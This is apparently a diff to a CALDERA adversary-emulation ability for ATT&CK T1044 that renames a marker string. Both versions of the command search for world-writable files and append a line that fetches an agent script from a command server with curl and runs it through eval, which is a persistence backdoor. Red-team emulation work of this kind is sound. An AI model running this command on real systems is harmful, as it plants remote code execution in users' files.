@@ -10,4 +10,4 @@
     attack_id: T1044
     name: File System Permissions Weakness
   command: |
-    find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "CALDERA_SCRIPT" "{}" || echo "#CALDERA_SCRIPT" eval "$(curl -sk -X POST -H "file:54ndc47.sh" #{server}/file/render?group=#{group})" >> "{}"; ls "{}" ' \;
+    find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT" eval "$(curl -sk -X POST -H "file:54ndc47.sh" #{server}/file/render?group=#{group})" >> "{}"; ls "{}" ' \;
